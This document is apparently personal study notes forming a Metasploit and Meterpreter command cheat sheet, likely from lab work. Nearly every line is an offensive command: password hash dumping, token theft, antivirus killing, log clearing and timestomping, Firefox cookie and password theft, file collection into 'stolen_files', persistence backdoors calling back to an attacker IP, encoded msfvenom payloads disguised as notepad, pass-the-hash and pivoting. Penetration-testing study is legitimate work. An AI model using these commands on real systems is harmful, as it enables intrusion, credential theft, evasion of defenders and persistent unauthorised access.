show command 
search command 
search dcom (get all the modulue dcom mentioned in that)
use commadn (to use module)
show option ( tells you different input require to run )
set command ( to set the values of current module you are working in)
enumdesktops
getdesktop
setdesktop
unset ( unset the value)
setg (if you want to set the value golbally which ever module you use it uses the same ip that you set wth setg)
back ( go to back )
set payload ( to set payload)
getwd  ( show current meterpreter (path)
---------------------------------------------------------------
Meterpreter
---------------------------------------------------------------
Background - to background current session
sessions -l to look running sessions
session -i 1 to connect particular sesssion
irb - it will get you in ruby scripting mode were you can write rubby script for metepreter
migrate- it will migrate into new process

stdapi command
ipconfig- display interface
portfwd- forward local port to remote service 
route -view and modif route
getuid- to check at which user account  meterprert is running
getpid- check process id
ps- to check running process 
kill -kill process
pwd- to check current directory
cd- to chnage directory
cat - to view d
download - to download file
search - search -d c:\\ -f *.doc
idletime - shows how long remote user had not interact with system 
execute -f cmd.exe -c
channel -l (list out channel)
interact 8 - to interact channel
write  9 : write to channel
close: close 9 closes channel
hashdump (dump the database drom SAM file)
timestomp c:\hacked.txt -c "09/09/1980 12:12:34"
	   c:\hacked.txt -m "09/09/1980 12:12:34"
giving other file time attribute to our file (c:\hacked.txt -f c:\confidential.txt)

use inconginto
list token -u
impersonate_token SAMI-89B9B81FE1\\Administrator
getuid
rev2self(primary process token in system)
ps (check prosess)
steal_token (steal_token 2024) (steal token from process)
------------------------------------------------
use espia (to lload espia extension)
msf5 > use auxiliary/server/browser_autopwn
screengrab
use sniffer
sniffer_interface
sniffer_start 1
sniffer_dump 1 victim.pcap
snifer_stop 1
meterpeter scipt 
run 
run checkvm
run credcollect
run enum_firefox ( collect alll the data related to firefox like stored cookies passwordt etc and stored it in attacker machinbe)
run post/windows/gather/enum_applications (show application running)
run post/windows/gather/enum_firefox
---------------
post exploitation
getuid
sysinfo
run checkvm
idletime
run get_env 
run post/multi/gather/env 
ps
ipconfig
route
post/windows/gather/enum_applications
run get_local_subnets
run post/windows/gather/enum_logged_on_users
run scraper 
ls .msf4/logs/scripts/scraper/
run winenum
run prefetchtool (depreciated)
previlage esclation
run kitrapOd ( exploit kerner vulberability)
list_token -u
run killav
cd /usr/share/metasploit-framework/scripts/meterpreter ( add executable name which you want to kill while script got executed)
 execute -H -f cmd.exe -c (creatre hidden process with chaneel )
channel -i 1
tasklist
tasklist /SVC (service running)
tasklist /SVC | find /I "avg"
taskkill /F /IM "avg*"
sc queryex avg9wd
sc config avg9wd start= disabled
tasklist /SVC | find /I "avg"
taskkill /F /PID 1560
run getcountermeasure (shows firewall configurations)
task kill /F /PID 1560
clearev -h (clear log file)
run file_collector -d c:\\ -f *.txt -r (search for text file) 
run file_collector -d c:\\ -f *.txt -r | *.pst -r -o files_found (where email are stored)
run file_collector -i /root/files_found -l /root/stolen_files
run enum_firefox (only get config file of the user which we logged in)
/.msf4/logs/scripts/enum_firefox/192.
ls
sqllite3 admin_cookie
select * from moz_cookies;
getlwd (display present directory)
lcd /root/firepassword_bin
uplad firepassword.exe( uplaod file on remote system)
shell
firepassword_bin.exe
use incongnito -u
run enum_putty
---------
backdooor
run persistence -h 
run persistence -A -U -i 10 -p 30000 -r 192.168.111.157
jobs
run multi_console_command -rc (  clean up)
run metsvc  -A (backdoor service)  (check once again) ?>/??????????????????
pivoting
run arp_scanner -r 10.10.10.1/24 (find connected nodes )
use auxiliary/scanner/portscan/tcp 
set rhosts 10.10.10.150
set ports 1-200
run autoroute add 10.10.10.150 -s 255.255.255.0
run autoroute -p
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/bind_tcp
port forwadrding
portfwd add -l 25000 -p 80 -r 10.10.10.150
/usr/bin/msfvenom -p windows/meterpreter/bind_tcp rHOST=192.168.111.159 -f exe -o bind.exe (generate payload)
/usr/bin/msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe -o bind_encode ( encoded)
/usr/bin/msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp RHOST=192.168.111.159 -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe -o bind_encode3 -x note.exe -k ( encoded and impersonate ntoe padd apllication like torjan)
use auxiliary/scanner/discovery/arp_sweep
hashdump
use windows/smb/psexec
set smbuser admin
set smbpass (paste the hashses)
use auxiliary/scanner/smb/smb_enumshares
railgun
irb
rail.LockWorkstation()
railgun.netapi32.NetUserDel(nil, "sami")
add dll
railgun.add_dll("mpr", "c:\\windows\\system32\\mpr.dll")
>> railgun.add_function("mpr", "WNetGetUserW", "DWORD", [ ["PWCHAR", "lpname", "in" ], ["PWCHAR", "lpusername", "out" ], [ "PDWORD", "lplen", "inout" ] ])
railgun.mpr.WNetGetUserW(nil, 50, 50)
resource script
vim .msf4/msfconsole.rc
we can give in msf
msf5 > resource msfconsole.rc
in meterpreter
meterpretr> resource msfconsole.rc
#>msfconsole -r rescource.rc

creating database for msf
systemctl start postgresql.service
msfdb init
cat /usr/share/metasploit-framework/config/database.yml
root@kali:~# cp /usr/share/metasploit-framework/config/database.yml ./msfconsole.rc 
workspace -a msfe
msf5 > services -a -r tcp -p 22 -s ssh 192.168.111.59
msf5 > db_nmap -n -sV 192.168.111.159
msf5 > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > services -p 445
msf5 exploit(windows/smb/ms08_067_netapi) > services -p 445 -R
msf5 > db_export -f xml smfe.xml
msf5 > db_import 
plugins
load wmap
use auxiliary/scanner/http/crawler
wmap_sites -l
wmap_targets -t http://192.168.111.159
wmap_targets -e http://192.168.111.159
meterpeter API
/usr/share/metasploit-framework/lib/rex/post/meterpreter#
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi#
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs
fs.dir.pwd
fs.dir.entries("c:\\")
>> fs.dir.chdir("c:\\windows")
sys.config.sysinfo
sys.config.sysinfo["Computer"]
net.config.get_interfaces
net.config.get_routes
migrate clone
root@kali:/usr/share/metasploit-framework/lib/rex/post/meterpreter# vi client_core.rb 
using template to create script
sys.process.get_processes












